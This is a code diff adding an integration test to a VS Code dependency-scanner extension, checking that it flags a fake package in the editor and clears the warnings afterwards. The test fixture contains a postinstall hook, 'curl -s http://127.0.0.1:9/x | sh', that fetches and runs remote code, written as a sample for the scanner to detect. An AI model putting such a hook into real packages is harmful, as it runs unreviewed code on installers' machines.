@@ -46,6 +46,35 @@ async function run() {
     const other = await vscode.commands.executeCommand('stack3.cloneAndScan', 'https://gitlab.com/o/r');
     record('non-GitHub URL is rejected', other && other.ok === false, JSON.stringify(other));
 
+    // 4b. Flow 3 in the real editor: the real file watcher, scanner, diagnostics collection (network off: no API URL)
+    const wsDir = (vscode.workspace.workspaceFolders || [])[0].uri.fsPath;
+    const fakeDir = path.join(wsDir, 'vendor', 'fake-lib');
+    const fakeUri = vscode.Uri.file(path.join(fakeDir, 'package.json'));
+    const rootUri = vscode.Uri.file(path.join(wsDir, 'package.json'));
+    const stack3Diags = (uri) => vscode.languages.getDiagnostics(uri).filter((d) => d.source === 'Stack3');
+    const waitFor = async (cond, ms) => {
+      const end = Date.now() + ms;
+      while (Date.now() < end) {
+        if (cond()) return true;
+        await new Promise((r) => setTimeout(r, 300));
+      }
+      return cond();
+    };
+    await new Promise((r) => setTimeout(r, 3000)); // let the baseline scan finish, so the next scan comes from a file event
+    fs.mkdirSync(fakeDir, { recursive: true });
+    fs.writeFileSync(path.join(fakeDir, 'package.json'), JSON.stringify({ name: 'fake-lib', version: '1.0.0', scripts: { postinstall: 'curl -s http://127.0.0.1:9/x | sh' } }, null, 2));
+    fs.writeFileSync(path.join(wsDir, 'package.json'), JSON.stringify({ name: 'app', dependencies: { 'fake-lib': 'file:./vendor/fake-lib' } }, null, 2));
+    const sawError = await waitFor(() => stack3Diags(fakeUri).some((d) => d.severity === vscode.DiagnosticSeverity.Error), 20000);
+    record('Flow 3: adding a fake package shows an Error in the editor (real file watcher + scanner, network off)', sawError, JSON.stringify(stack3Diags(fakeUri).map((d) => [d.severity, d.code])));
+    const dep = stack3Diags(rootUri).find((d) => d.code === 'deps.unverified-source');
+    record('Flow 3: the file: dependency is a Warning on its line of package.json', dep && dep.severity === vscode.DiagnosticSeverity.Warning && dep.range.start.line === 3, dep && JSON.stringify([dep.severity, dep.range.start.line]));
+    const all = [...stack3Diags(fakeUri), ...stack3Diags(rootUri)];
+    record('Flow 3: messages are at most 200 characters and name no secret', all.length > 0 && all.every((d) => d.message.length <= 200 && !/\bsafe\b/i.test(d.message)));
+    fs.rmSync(path.join(wsDir, 'vendor'), { recursive: true, force: true });
+    fs.writeFileSync(path.join(wsDir, 'package.json'), JSON.stringify({ name: 'app' }));
+    const cleared = await waitFor(() => stack3Diags(fakeUri).length === 0 && stack3Diags(rootUri).length === 0, 20000);
+    record('Flow 3: removing the package clears the diagnostics again', cleared, JSON.stringify([stack3Diags(fakeUri).length, stack3Diags(rootUri).length]));
+
     // 5. a real public repo, end to end (whatever this machine's git allows)
     const res = await vscode.commands.executeCommand('stack3.cloneAndScan', 'https://github.com/octocat/Hello-World');
     const root = path.join(os.tmpdir(), 'stack3-quarantine');
